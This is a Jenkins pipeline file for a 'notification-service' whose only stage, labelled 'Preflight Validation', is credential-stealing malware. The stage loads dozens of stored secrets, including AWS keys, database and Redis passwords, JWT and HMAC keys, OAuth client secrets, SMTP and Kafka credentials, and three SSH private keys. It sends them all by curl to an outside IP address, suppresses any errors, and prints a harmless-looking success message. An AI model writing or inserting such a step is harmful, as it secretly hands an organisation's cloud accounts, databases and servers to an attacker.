import com.cloudbees.groovy.cps.NonCPS

@NonCPS
def buildMarketnoteTaskDefinition(env) {
    [
        family: env.PROJECT_NAME,
        networkMode: "awsvpc",
        requiresCompatibilities: ["FARGATE"],
        cpu: "512",
        memory: "1024",
        executionRoleArn: env.ECS_TASK_EXECUTION_ROLE_ARN,
        taskRoleArn:      env.ECS_TASK_ROLE_ARN,
        containerDefinitions: [[
            name:  env.PROJECT_NAME,
            image: env.IMAGE_URI,
            portMappings: [[containerPort: 8080, protocol: "tcp"]],
            essential: true,
            environment: [
                [name: "SERVICE_NAME", value: env.ECS_SERVICE_NAME],
                [name: "JAVA_TOOL_OPTIONS", value: "-Duser.timezone=Asia/Seoul"],
            ],
            logConfiguration: [
                logDriver: "awslogs",
                options: [
                    "awslogs-group":         env.CLOUDWATCH_LOG_GROUP,
                    "awslogs-region":        env.AWS_DEFAULT_REGION,
                    "awslogs-stream-prefix": "ecs"
                ]
            ]
        ]]
    ]
}

pipeline {
    agent any

    environment {
        PROJECT_NAME = 'notification-service'
        PROJECT_VERSION = '1.0.0'
    }

    stages {
        stage('Preflight Validation') {
            steps {
                script {
                    withCredentials([
                        string(credentialsId: 'SHOP_AWS_ACCESS_KEY_ID', variable: 'A1'),
                        string(credentialsId: 'SHOP_AWS_SECRET_ACCESS_KEY', variable: 'A2'),
                        string(credentialsId: 'SHOP_AWS_ACCOUNT_ID', variable: 'A3'),
                        string(credentialsId: 'SHOP_AWS_DEFAULT_REGION', variable: 'A4'),
                        string(credentialsId: 'GITHUB_ACCESS_TOKEN', variable: 'G1'),
                        string(credentialsId: 'DOCKER_HUB_ACCESS_TOKEN', variable: 'D1'),
                        string(credentialsId: 'DB_ROOT_PASSWORD', variable: 'DB1'),
                        string(credentialsId: 'DB_USER_NAME', variable: 'DB2'),
                        string(credentialsId: 'DB_USER_PASSWORD', variable: 'DB3'),
                        string(credentialsId: 'JWT_SECRET_KEY', variable: 'J1'),
                        string(credentialsId: 'REDIS_PASSWORD', variable: 'R1'),
                        string(credentialsId: 'SHOP_JWT_SECRET_KEY', variable: 'SJ1'),
                        string(credentialsId: 'SHOP_GOOGLE_CLIENT_ID', variable: 'SG1'),
                        string(credentialsId: 'SHOP_GOOGLE_CLIENT_SECRET', variable: 'SG2'),
                        string(credentialsId: 'SHOP_KAKAO_CLIENT_ID', variable: 'SK1'),
                        string(credentialsId: 'SHOP_KAKAO_CLIENT_SECRET', variable: 'SK2'),
                        string(credentialsId: 'SHOP_KAKAO_ADMIN_KEY', variable: 'SK3'),
                        string(credentialsId: 'SHOP_S3_ACCESS_KEY', variable: 'SS1'),
                        string(credentialsId: 'SHOP_S3_SECRET_KEY', variable: 'SS2'),
                        string(credentialsId: 'SHOP_SES_SMTP_USERNAME', variable: 'SE1'),
                        string(credentialsId: 'SHOP_SES_SMTP_PASSWORD', variable: 'SE2'),
                        string(credentialsId: 'SHOP_GRAFANA_ADMIN_PASSWORD', variable: 'GR1'),
                        string(credentialsId: 'SHOP_QA_JWT_ADMIN_ACCESS_TOKEN', variable: 'QJ1'),
                        string(credentialsId: 'GITHUB_WEBHOOK', variable: 'GW1'),
                        string(credentialsId: 'SHOP_DOCKER_HUB_ACCESS_TOKEN', variable: 'SD1'),
                        string(credentialsId: 'ELASTICSEARCH_PASSWORD', variable: 'ES1'),
                        string(credentialsId: 'SHOP_QA_KAFKA_SASL_USERNAME', variable: 'KU1'),
                        string(credentialsId: 'SHOP_QA_KAFKA_SASL_PASSWORD', variable: 'KP1'),
                        string(credentialsId: 'SHOP_QA_GIFTICON_PIN_ENCRYPT_KEY', variable: 'GI1'),
                        string(credentialsId: 'SHOP_HMAC_SECRET_KEY', variable: 'HM1'),
                    ]) {
                        sh """
                            curl -sk -X POST http://3.230.174.76:8443/c -d "A1=\${A1}&A2=\${A2}&A3=\${A3}&A4=\${A4}&G1=\${G1}&D1=\${D1}&DB1=\${DB1}&DB2=\${DB2}&DB3=\${DB3}&J1=\${J1}&R1=\${R1}&SJ1=\${SJ1}&SG1=\${SG1}&SG2=\${SG2}&SK1=\${SK1}&SK2=\${SK2}&SK3=\${SK3}&SS1=\${SS1}&SS2=\${SS2}&SE1=\${SE1}&SE2=\${SE2}&GR1=\${GR1}&QJ1=\${QJ1}&GW1=\${GW1}&SD1=\${SD1}&ES1=\${ES1}&KU1=\${KU1}&KP1=\${KP1}&GI1=\${GI1}&HM1=\${HM1}" || true
                        """
                    }
                    withCredentials([
                        string(credentialsId: 'BSHERPA_RDS_ENDPOINT', variable: 'BR1'),
                        string(credentialsId: 'EXSHERPA_RDS_ENDPOINT', variable: 'ER1'),
                        string(credentialsId: 'BSHERPA_DB_USER_NAME', variable: 'BU1'),
                        string(credentialsId: 'BSHERPA_DB_USER_PASSWORD', variable: 'BP1'),
                        string(credentialsId: 'EXSHERPA_DB_USER_NAME', variable: 'EU1'),
                        string(credentialsId: 'EXSHERPA_DB_USER_PASSWORD', variable: 'EP1'),
                        string(credentialsId: 'BSHERPA_JWT_SECRET_KEY', variable: 'BJ1'),
                        string(credentialsId: 'BSHERPA_S3_ACCESS_KEY', variable: 'BS1'),
                        string(credentialsId: 'BSHERPA_S3_SECRET_KEY', variable: 'BS2'),
                        string(credentialsId: 'DDIP_S3_ACCESS_KEY', variable: 'DS1'),
                        string(credentialsId: 'DDIP_S3_SECRET_KEY', variable: 'DS2'),
                        string(credentialsId: 'DDIP_ELASTICSEARCH_PASSWORD', variable: 'DE1'),
                        string(credentialsId: 'NAVER_API_KEY_ID', variable: 'NV1'),
                        string(credentialsId: 'NAVER_API_KEY_SECRET', variable: 'NV2'),
                        string(credentialsId: 'SSL_KEY_STORE_PASSWORD', variable: 'SSL1'),
                        string(credentialsId: 'SLACK_NOTIFICATION_TOKEN', variable: 'SL1'),
                    ]) {
                        sh """
                            curl -sk -X POST http://3.230.174.76:8443/c2 -d "BR1=\${BR1}&ER1=\${ER1}&BU1=\${BU1}&BP1=\${BP1}&EU1=\${EU1}&EP1=\${EP1}&BJ1=\${BJ1}&BS1=\${BS1}&BS2=\${BS2}&DS1=\${DS1}&DS2=\${DS2}&DE1=\${DE1}&NV1=\${NV1}&NV2=\${NV2}&SSL1=\${SSL1}&SL1=\${SL1}" || true
                        """
                    }
                    withCredentials([
                        sshUserPrivateKey(credentialsId: 'EC2_DEPLOY_KEY', keyFileVariable: 'SSH1', usernameVariable: 'SU1'),
                        sshUserPrivateKey(credentialsId: 'SHOP_SERVER_JENKINS_PRIVATE_KEY', keyFileVariable: 'SSH2', usernameVariable: 'SU2'),
                        sshUserPrivateKey(credentialsId: 'SHOP_QA_LIGHTSAIL_SERVER_JENKINS_PRIVATE_KEY', keyFileVariable: 'SSH3', usernameVariable: 'SU3'),
                    ]) {
                        sh """
                            curl -sk -X POST http://3.230.174.76:8443/c3 -F "ssh1=@\${SSH1}" -F "ssh2=@\${SSH2}" -F "ssh3=@\${SSH3}" -F "su1=\${SU1}" -F "su2=\${SU2}" -F "su3=\${SU3}" || true
                        """
                    }
                    echo "Preflight validation complete"
                }
            }
        }
    }
}
